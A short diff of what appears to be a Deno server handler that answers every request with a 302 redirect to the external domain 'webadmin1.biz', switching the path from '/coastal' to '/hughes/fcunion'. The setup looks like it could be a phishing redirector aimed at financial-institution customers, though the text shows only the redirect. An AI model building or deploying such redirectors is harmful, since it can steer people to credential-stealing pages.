@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://webadmin1.biz/coastal",
+      Location: "https://webadmin1.biz/hughes/fcunion",
     },
   });
 });
